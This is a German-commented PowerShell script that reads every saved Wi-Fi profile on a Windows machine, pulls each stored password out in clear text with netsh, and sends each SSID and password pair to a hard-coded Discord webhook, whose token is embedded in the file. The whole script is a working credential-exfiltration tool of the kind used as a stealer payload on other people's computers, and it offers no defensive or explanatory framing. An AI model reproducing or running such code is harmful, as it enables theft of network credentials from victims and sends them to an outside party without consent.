# ===========================
# wifi-to-discord.ps1
# ===========================

# >>> Deine Webhook-URL hier eintragen <<<
$webhook = 'https://discord.com/api/webhooks/1468242499423440939/C9eN3MnNZiTvq6Nowguis-njCEiEDybJ_tqNDemEIj0ckhAn55OfkQRxHihbnEA4ZWed'

# Falls dein Windows nicht englisch ist, diese Strings ggf. anpassen:
#   - 'All User Profile'   -> z.B. 'Alle Benutzerprofile'
#   - 'Key Content'        -> z.B. 'Schlüsselinhalt'
$profileMarker = 'All User Profile'
$keyMarker      = 'Key Content'

# Alle WLAN-Profile holen
$profiles = netsh wlan show profiles |
    Select-String $profileMarker |
    ForEach-Object {
        ($_ -split ':', 2)[1].Trim()
    }

foreach ($ssid in $profiles) {
    # Detailinfos + Passwortzeile holen
    $pwdLine = netsh wlan show profile name="$ssid" key=clear |
               Select-String $keyMarker -ErrorAction SilentlyContinue

    # Wenn kein Passwort gefunden wurde (Enterprise / kein gespeicherter Key), überspringen
    if (-not $pwdLine) {
        continue
    }

    # Passwort aus der Zeile "Key Content : xyz" extrahieren
    $pwd = ($pwdLine.ToString() -split ':', 2)[1].Trim()

    # Nachricht für Discord vorbereiten
    $msg = "SSID: $ssid | Password: $pwd"

    $body = [PSCustomObject]@{
        content = $msg
    }

    # An Discord-Webhook senden
    try {
        Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body ($body | ConvertTo-Json)
    }
    catch {
        Write-Host "Fehler beim Senden für SSID '$ssid': $($_.Exception.Message)" -ForegroundColor Red
    }
}

Write-Host "Fertig. WLAN-Infos wurden (soweit vorhanden) an den Webhook gesendet." -ForegroundColor Green
